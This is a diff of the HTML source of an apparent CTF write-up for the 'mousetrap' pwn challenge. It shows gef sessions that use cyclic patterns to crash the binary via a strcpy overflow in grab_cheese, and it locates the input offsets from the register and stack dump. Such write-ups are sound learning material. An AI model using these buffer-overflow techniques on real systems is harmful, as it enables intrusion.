+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Generating&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;aaaaaaaabaaaaaaacaaaaaaadaaaaaaa&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Saved&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$_gef0'&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Starting&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;program&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bikram&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mystuff&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onlinectf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hackpack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pwn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mousetrapfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mousetrap&lt;/span&gt; 
+&lt;span class=&quot;nx&quot;&gt;Welcome&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;little&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mouse&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;can&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;steal&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cheese&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mouse&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;trap&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;aaaaaaaabaaaaaaacaaaaaaadaaaaaaa&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Enter&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Code&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Sequence&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7016996765293437284&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SNAAAAAAAP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;died&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Inferior&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11792&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exited&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;normally&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt; 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;&lt;strong&gt;24 bytes data:&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  pattern create 24
-[+] Generating a pattern of 24 bytes
-aaaaaaaabaaaaaaacaaaaaaa
-[+] Saved as '$_gef0'
-gef➤  run
-Starting program: /home/bikram/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap 
-Welcome little mouse
-can you steal the cheese from the mouse trap
-Name: aaaaaaaabaaaaaaacaaaaaaa
-Enter Code Sequence of 10: 
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Generating&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;aaaaaaaabaaaaaaacaaaaaaa&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Saved&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$_gef0'&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Starting&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;program&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bikram&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mystuff&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onlinectf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hackpack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pwn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mousetrapfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mousetrap&lt;/span&gt; 
+&lt;span class=&quot;nx&quot;&gt;Welcome&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;little&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mouse&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;can&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;steal&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cheese&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mouse&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;trap&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;aaaaaaaabaaaaaaacaaaaaaa&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Enter&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Code&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Sequence&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;From here I was asked for code sequence. Then offset of code sequence was found as follow:-&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  pattern create 100
-[+] Generating a pattern of 100 bytes
-aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
-[+] Saved as `'$_gef0'`  
-gef➤  run
-Starting program: /home/bikram/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap
-Welcome little mouse
-can you steal the cheese from the mouse trap
-Name: aaaaaaaabaaaaaaacaaaaaaa@
-Enter Code Sequence of 2624: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Generating&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Saved&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`'$_gef0'`&lt;/span&gt;  
+&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Starting&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;program&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bikram&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mystuff&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onlinectf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hackpack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pwn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mousetrapfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mousetrap&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Welcome&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;little&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mouse&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;can&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;steal&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cheese&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mouse&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;trap&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;aaaaaaaabaaaaaaacaaaaaaa&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Enter&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Code&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Sequence&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2624&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa&lt;/span&gt;
 
-Program received signal SIGSEGV, Segmentation fault.
-0x00000000004007e2 in `grab_cheese` ()
-[ Legend: Modified register | Code | Heap | Stack | String ]
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
-$rax   : 0x00007fffffffdb60  →  &quot;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]&quot;
-$rbx   : 0x0               
-$rcx   : 0x60              
-$rdx   : 0x15              
-$rsp   : 0x00007fffffffdb78  →  &quot;daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]&quot;
-$rbp   : 0x6161616161616163 (&quot;caaaaaaa&quot;?)
-$rsi   : 0x00007fffffffdbe0  →  &quot;kaaaaaaalaaaaaaamaaa\n&quot;
-$rdi   : 0x00007fffffffdbb0  →  &quot;kaaaaaaalaaaaaaamaaa\n&quot;
-$rip   : 0x00000000004007e2  →  &amp;lt;grab_cheese+33&amp;gt; ret 
-$r8    : 0x0               
-$r9    : 0x1d              
-$r10   : 0x00007ffff7feff40  →  `&amp;lt;strcmp+4464&amp;gt;` pxor xmm0, xmm0
-$r11   : 0x00007ffff7f3fc00  →  `&amp;lt;__strcpy_avx2+0&amp;gt;` mov rcx, rsi
-$r12   : 0x0000000000400630  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
-$r13   : 0x00007fffffffdd90  →  0x0000000000000001
-$r14   : 0x0               
-$r15   : 0x0               
-$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
-$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
-0x00007fffffffdb78│+0x0000: &quot;daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]&quot;	 ← $rsp
-0x00007fffffffdb80│+0x0008: &quot;eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]&quot;
-0x00007fffffffdb88│+0x0010: &quot;faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]&quot;
-0x00007fffffffdb90│+0x0018: &quot;gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]&quot;
-0x00007fffffffdb98│+0x0020: &quot;haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n&quot;
-0x00007fffffffdba0│+0x0028: &quot;iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n&quot;
-0x00007fffffffdba8│+0x0030: &quot;jaaaaaaakaaaaaaalaaaaaaamaaa\n&quot;
-0x00007fffffffdbb0│+0x0038: &quot;kaaaaaaalaaaaaaamaaa\n&quot;	 ← $rdi
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
-     0x4007db &amp;lt;grab_cheese+26&amp;gt; call   0x4005d0 &amp;lt;strcpy@plt&amp;gt;
-     0x4007e0 &amp;lt;grab_cheese+31&amp;gt; nop    
-     0x4007e1 &amp;lt;grab_cheese+32&amp;gt; leave  
- →   0x4007e2 &amp;lt;grab_cheese+33&amp;gt; ret    
-[!] Cannot disassemble from $PC
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
-[#0] Id 1, Name: &quot;mousetrap&quot;, stopped 0x4007e2 in `grab_cheese ()`, reason: SIGSEGV
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
-[#0] 0x4007e2 → `grab_cheese()`
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-gef➤  
+&lt;span class=&quot;nx&quot;&gt;Program&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;received&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;signal&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SIGSEGV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Segmentation&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fault&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004007e2&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`grab_cheese`&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Legend&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Modified&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;register&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Heap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Stack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;registers&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rax&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb60&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rbx&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;               
+&lt;span class=&quot;nv&quot;&gt;$rcx&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;              
+&lt;span class=&quot;nv&quot;&gt;$rdx&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15&lt;/span&gt;              
+&lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb78&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rbp&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6161616161616163&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;caaaaaaa&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rsi&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdbe0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;kaaaaaaalaaaaaaamaaa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rdi&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdbb0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;kaaaaaaalaaaaaaamaaa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rip&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000004007e2&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;grab_cheese&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;$r8&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;               
+&lt;span class=&quot;nv&quot;&gt;$r9&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1d&lt;/span&gt;              
+&lt;span class=&quot;nv&quot;&gt;$r10&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007ffff7feff40&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`&amp;lt;strcmp+4464&amp;gt;`&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pxor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xmm0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xmm0&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r11&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007ffff7f3fc00&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`&amp;lt;__strcpy_avx2+0&amp;gt;`&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r12&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000400630&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebp&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r13&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdd90&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x0000000000000001&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$r14&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;               
+&lt;span class=&quot;nv&quot;&gt;$r15&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;               
